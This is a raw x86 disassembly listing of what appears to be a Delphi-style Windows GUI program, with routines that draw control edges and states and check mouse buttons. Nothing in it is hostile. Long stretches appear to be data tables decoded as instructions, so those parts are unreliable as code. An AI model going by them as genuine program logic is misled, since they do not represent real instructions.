mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484786
retn
xor eax eax
mov [ rw-data ] eax
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
sub_484788
aam 0x47
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
dec eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
dec eax
dec eax
add al dl
add [ eax ] eax
add [ esi + ebp ] dh
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
sub_48481c
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_484844
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ eax ] cl
mov esi 0xcdd40044
inc esp
add [ eax - 0xfffb87b ] ch
push esi
dec eax
add ah ch
mov es [ edi ]
hlt
sub_48490c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
dec edx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ecx * 2 ] bh
dec eax
add [ eax - 0x1bffffff ] bh
das
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al ch
xchg ecx eax
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ ecx + edx * 4 - 0x27b7ffb9 ] ch
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4849c4
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ edx + edx ] ah
inc edi
add ah dl
int 0x44
add [ edi + edx * 4 ] cl
inc edi
add al ah
daa
dec eax
add [ ebx + edx * 4 + 0x47 ] bh
add ah dh
aas
dec eax
add [ eax + 0xe ] cl
inc edi
add al cl
cmp ecx [ eax ]
mov [ eax + ecx * 2 ] gs
add al cl
adc al [ edi ]
jl r-xdata
inc edx
jne r-xdata
dec eax
add [ eax - 0xbffb79e ] cl
xor cl [ eax ]
pop eax
xor [ eax ] cl
hlt
pop ebx
inc edi
add al al
insd
je r-xdata
inc edi
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
inc ecx
add [ ebx + ebx * 2 + 0x6dc00047 ] dl
outsb
push esp
dec ecx
dec eax
add [ eax + 0x31 ] bl
inc edi
add [ ebx ] cl
add [ ebx ] cl
pop eax
push eax
inc ecx
arpl [ esi + ebp * 2 + 0x43 ] si
je r-xdata
push ss
inc edx
add al ch
bound ecx [ eax ]
in al 0x36
inc ebp
add al ah
insb
inc edi
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
mov eax 0x9800476c
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
inc edx
add [ eax - 0x13ffbded ] dh
insb
jae r-xdata
add ah cl
dec edx
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 2 + 0x48 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
dec eax
add [ esp + ecx * 2 + 0x48 ] ch
add [ ebx + eax ] bl
add [ eax ] al
or al 0x26
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] ch
arpl [ eax ] cx
sar [ ebx ] 0x1
inc ebp
add al bh
add eax [ ebp ]
and al 0x8f
sub_484cb4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x48 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
dec ebp
dec eax
add al dl
add [ eax ] eax
add [ esp + 0x16cc0047 ] al
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx - 0x1647ffb9 ] bh
inc esp
add [ eax + 0x240044dd ] dh
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esp + ebx * 2 ] cl
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_484e59
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al al
dec eax
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0xc ] dl
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_484ee8
or cl cl
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ edx + edx ] ah
inc edi
add ah dl
int 0x44
add [ eax + edx + 0x27e00047 ] dh
dec eax
add al dh
inc edx
dec eax
add ah dh
aas
dec eax
add [ eax + 0xe ] cl
inc edi
add al cl
cmp ecx [ eax ]
int3
sub_484fad
push eax
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push eax
dec eax
add [ eax + 0x78000001 ] bh
add eax 0x16cc0047
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add al al
dec eax
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + 0xc ] dl
inc edi
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_485124
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ ebx + 0x48 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 2 ] cl
dec eax
add [ eax ] ch
add eax [ eax ]
add [ eax + 0x28 ] ch
inc edi
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ edi + ebp * 2 + 0x47 ] bl
add al dl
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ ebx + ebx * 2 + 0x6dc00047 ] dl
inc edi
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ eax + esi * 2 + 0x36e40048 ] cl
inc ebp
add [ edi + ebp * 2 + 0x3b4c0047 ] cl
inc ebp
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
mov eax 0x9800476c
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ eax + 0x20 ] bh
inc edi
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x64 ] 0x5c004751
0x44
sub_48535c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
push esp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2fffb7ac ] dl
add [ eax ] eax
add al bh
add eax [ edi ]
int3
sub_485385
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ ebx + edx - 0x1647ffb9 ] bh
inc esp
add [ eax + 0x240044dd ] dh
pop [ ecx ]
dec esp
push cs
inc edi
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add [ esi + edx + 0x47 ] bl
add [ eax - 0x28 ] cl
inc esp
add [ eax + ebx * 8 + 0x44 ] al
add [ ecx + ebx * 8 ] dl
inc esp
add [ eax + eax * 2 - 0x3d03ffb8 ] bl
inc esp
add [ eax - 0x3e ] ah
inc esp
add [ eax - 0x27ffbb35 ] cl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
sub_4854e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x56
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esi
dec eax
add al dl
add [ eax ] eax
add [ eax - 0x33ffb8cf ] cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi - 0x2327ffc0 ] al
inc esp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x7c ] dh
inc edi
add [ eax - 0x4fffbb17 ] bh
fld [ eax + eax + 0x24 ]
pop [ ecx ]
sub cl 0x44
add [ edi * 4 - 0x4377ffbc ] bl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al cl
add [ edi ] 0x48
fadd [ eax + eax + 0x44 ]
fadd [ eax + eax + 0x14 ]
fld [ eax + eax - 0x64 ]
inc eax
dec eax
add ah bh
retn 0x44
sub_485570
mov bl cl
inc esp
add al bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add [ eax ] al
outsd
inc edi
add [ eax - 0x39 ] cl
inc esp
add [ edx + ecx * 8 + 0x44 ] bl
add [ eax ] cl
leave
inc esp
add [ ebx + ebx * 8 + 0x44 ] al
add [ eax + eax * 2 - 0x32b7ffb8 ] dh
inc esp
add ah dh
int 0x44
add [ eax ] cl
mov esi 0xcdd40044
inc esp
add [ eax + 0x60004785 ] ch
mov [ edi ] es
in al dx
mov es [ edi ]
hlt
sub_485664
push 0x2
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
mov al 0x1
retn
push 0x1
call GetAsyncKeyState
movsx eax ax
test ah 0x80
jne r-xdata
xor eax eax
retn
sub_485688
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_478ae8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
mov edx [ ebx + 0x4c ]
add edx 0x2
mov eax ebx
call sub_44c02c
mov edx 0x3
mov eax ebx
call sub_44c02c
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
lea esi [ ebx + 0x190 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
inc [ esp + 0x4 ]
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_483f8c
test al al
jne r-xdata
sub_4856f0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_478c60
mov ecx esp
mov edx [ ebx + 0x176 ]
inc edx
mov eax [ ebx + 0x172 ]
call sub_41725c
mov eax [ esp ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x176 ] eax
pop ecx
pop edx
pop ebx
retn
sub_485728
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax [ ebx + 0x16c ]
test eax eax
je r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x24 ]
cmp edx 0x20000000
je r-xdata
push esi
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ ebx + 0x172 ]
mov eax [ ebx + 0x190 ]
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
push esi
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp edx eax
jge r-xdata
xor ecx ecx
mov [ esp + 0x10 ] ecx
mov eax [ ebx + 0x198 ]
add eax 0x3
mov [ esp + 0x8 ] eax
sub eax 0x3
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax ebx
call sub_4840c8
call sub_48254c
call sub_47f734
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax 0x19
mov [ esp + 0x8 ] eax
sub eax [ esp ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x16c ]
call sub_47f37c
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov edx esp
mov eax [ ebx + 0x160 ]
call sub_4250a4
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_482b7c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
jne r-xdata
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
dec [ esi + 0x8 ]
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebx + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
cmp [ ebx + 0x1b0 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250a4
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
inc [ esi + 0x8 ]
mov edx esi
mov eax [ ebx + 0x160 ]
call sub_4250e0
sub_48590c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x16c ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
mov eax esi
call sub_47ecd0
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_417298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425260
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x58 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc0 ]
test al al
je r-xdata
add [ ebp - 0x14 ] 0x2
inc [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_482c8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_424c70
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
push 0x1
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
add edx 0x3
mov eax [ ebx ]
add eax 0x6
call sub_41725c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov ecx 0x2
call sub_46efa8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x28 ]
push eax
mov esi [ ebx ]
mov ecx esi
add ecx 0x14
mov eax esi
dec eax
mov edx 0x1
call sub_417298
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4250a4
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425260
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47ecd0
test al al
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c68
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42984c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_485cfe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb64
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47d74c
call sub_47cb00
mov ebx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb64
cmp [ eax + 0x5c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
call sub_424c70
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
mov edx [ eax + 0x58 ]
mov ecx [ ebp - 0x18 ]
mov eax ebx
call sub_45a4d8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb64
mov eax [ eax + 0x5c ]
mov ebx [ eax + 0x38 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1ac ]
call sub_48254c
mov eax [ eax + 0x68 ]
mov edx 0xffffffce
call sub_46ec74
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
mov edx [ ebx + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x34 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
push 0x84
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
add eax 0x2
push eax
mov eax [ ebp - 0x14 ]
add eax 0x3
push eax
push 0x0
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424ca4
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_425570
push eax
call DrawStateA
test ebx ebx
je r-xdata
sub_485d44
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e08
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x160 ]
mov ecx [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_424dc0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_485ea8
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebx + 0x160 ]
call sub_4250a4
mov edx [ ebx + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44c214
push 0x1
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawEdge
push 0x4
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawEdge
mov eax esi
call sub_47f37c
test al al
je r-xdata
mov eax [ ebx + 0x160 ]
mov edx 0x20
call sub_42517c
mov eax ebx
call sub_44c2bc
sar eax 0x1
jns r-xdata
adc ecx 0x0
cmp [ ebx + 0x1a0 ] 0x0
jne r-xdata
push eax
mov eax ebx
call sub_44c278
mov edx eax
mov eax [ ebx + 0x160 ]
pop ecx
call sub_42511c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485eaf
mov eax [ ebp - 0x8 ]
call sub_4032a8
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
adc eax 0x0
mov eax [ ebx + 0x160 ]
